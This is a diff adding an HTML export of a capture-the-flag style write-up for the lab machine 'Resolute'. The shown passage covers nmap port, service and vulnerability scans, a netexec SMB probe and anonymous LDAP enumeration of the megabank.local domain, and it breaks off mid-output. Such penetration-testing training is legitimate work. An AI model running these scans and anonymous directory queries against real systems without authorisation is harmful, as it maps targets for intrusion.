@@ -1,0 +1,2234 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Resolute - 10.10.10.169</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="18ed1b9f-8847-80da-a68d-c7a8e6bebe58" class="page sans"><header><h1 class="page-title"><strong>Resolute - 10.10.10.169</strong></h1><p class="page-description"></p></header><div class="page-body"><h1 id="18ed1b9f-8847-81fa-9b72-f9931b29980f" class="">Information Gathering &amp; Enumeration</h1><p id="18ed1b9f-8847-8139-9c51-d8b83bf488d1" class="">
+</p><h2 id="18ed1b9f-8847-8188-868b-f089c7fa0e55" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-816e-9874-e943120726d7" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ sudo nmap -sS --min-rate=5000 -p- -T5 -n 10.10.10.169
+[sudo] password for drroot: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 11:23 -05
+Warning: 10.10.10.169 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.10.169
+Host is up (0.11s latency).
+Not shown: 65512 closed tcp ports (reset)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49688/tcp open  unknown
+49728/tcp open  unknown
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8106-b610-efdc983c74cd" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap -sVC -T5 -n 10.10.10.169 -p53,88,135,139,389,445,464,596,636,3268,9389
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 11:27 -05
+Nmap scan report for 10.10.10.169
+Host is up (0.11s latency).
+
+PORT     STATE  SERVICE      VERSION
+53/tcp   open   domain       Simple DNS Plus
+88/tcp   open   kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-02 16:34:45Z)
+135/tcp  open   msrpc        Microsoft Windows RPC
+139/tcp  open   netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp  open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp  open   kpasswd5?
+596/tcp  closed smsd
+636/tcp  open   tcpwrapped
+3268/tcp open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+9389/tcp open   mc-nmf       .NET Message Framing
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-02-02T16:34:52
+|_  start_date: 2025-02-02T16:28:01
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2025-02-02T08:34:56-08:00
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 2h47m01s, deviation: 4h37m10s, median: 6m59s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.91 seconds
+		  
+</code></pre><p id="18ed1b9f-8847-8154-af32-e2f30a3b7a42" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8141-9bbb-cc94facba597" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap --script vuln 10.10.10.169 -p53,88,135,139,389,445,464,596,636,3268,9389
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 11:30 -05
+Nmap scan report for 10.10.10.169
+Host is up (0.11s latency).
+
+PORT     STATE  SERVICE
+53/tcp   open   domain
+88/tcp   open   kerberos-sec
+135/tcp  open   msrpc
+139/tcp  open   netbios-ssn
+389/tcp  open   ldap
+445/tcp  open   microsoft-ds
+464/tcp  open   kpasswd5
+596/tcp  closed smsd
+636/tcp  open   ldapssl
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+3268/tcp open   globalcatLDAP
+9389/tcp open   adws
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+
+Nmap done: 1 IP address (1 host up) scanned in 44.88 seconds
+
+                                                                </code></pre><p id="18ed1b9f-8847-81af-9f78-d02230e1bf44" class="">
+</p><h2 id="18ed1b9f-8847-8107-a16f-ef27ca612452" class="">SMB Enumeration → 445 port</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-81bb-8aef-f7237b572785" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ netexec smb 10.10.10.169    
+</code></pre><h2 id="18ed1b9f-8847-81b6-a591-fcab6a8d5018" class="">LDAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8148-9d5c-fcf0b36c3c03" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ ldapsearch -x -H ldap://10.10.10.169 -b &quot;dc=megabank,dc=local&quot; | grep -iE &quot;name|userPrincipalName|pwd&quot;
+distinguishedName: DC=megabank,DC=local
+name: megabank
+maxPwdAge: -9223372036854775808
+minPwdAge: -864000000000
+minPwdLength: 7
+pwdProperties: 0
+pwdHistoryLength: 24
+masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name
+-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
+e-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
+distinguishedName: CN=Users,DC=megabank,DC=local
+name: Users
+distinguishedName: CN=Computers,DC=megabank,DC=local
+name: Computers
+distinguishedName: OU=Domain Controllers,DC=megabank,DC=local
+name: Domain Controllers
+distinguishedName: CN=System,DC=megabank,DC=local
+name: System
+distinguishedName: CN=LostAndFound,DC=megabank,DC=local
+name: LostAndFound
+distinguishedName: CN=Infrastructure,DC=megabank,DC=local
+name: Infrastructure
+distinguishedName: CN=ForeignSecurityPrincipals,DC=megabank,DC=local
+name: ForeignSecurityPrincipals
+distinguishedName: CN=Program Data,DC=megabank,DC=local
+name: Program Data
+distinguishedName: CN=Microsoft,CN=Program Data,DC=megabank,DC=local
+name: Microsoft
+distinguishedName: CN=NTDS Quotas,DC=megabank,DC=local
+name: NTDS Quotas
+distinguishedName: CN=Managed Service Accounts,DC=megabank,DC=local
+name: Managed Service Accounts
+distinguishedName: CN=WinsockServices,CN=System,DC=megabank,DC=local
+name: WinsockServices
+distinguishedName: CN=RpcServices,CN=System,DC=megabank,DC=local
+name: RpcServices
+distinguishedName: CN=FileLinks,CN=System,DC=megabank,DC=local
+name: FileLinks
+distinguishedName: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=megabank,DC=lo
+name: ObjectMoveTable
+distinguishedName: CN=Default Domain Policy,CN=System,DC=megabank,DC=local
+name: Default Domain Policy
+distinguishedName: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=mega
+name: AppCategories
+distinguishedName: CN=Meetings,CN=System,DC=megabank,DC=local
+name: Meetings
+distinguishedName: CN=Policies,CN=System,DC=megabank,DC=local
+name: Policies
+distinguishedName: CN=RAS and IAS Servers Access Check,CN=System,DC=megabank,D
+name: RAS and IAS Servers Access Check
+distinguishedName: CN=File Replication Service,CN=System,DC=megabank,DC=local
+name: File Replication Service
+distinguishedName: CN=Dfs-Configuration,CN=System,DC=megabank,DC=local
+name: Dfs-Configuration
+distinguishedName: CN=IP Security,CN=System,DC=megabank,DC=local
+name: IP Security
+distinguishedName: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=IP
+name: ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}
+ipsecName: Server (Request Security)
+distinguishedName: CN=ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000},
+name: ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}
+distinguishedName: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP Sec
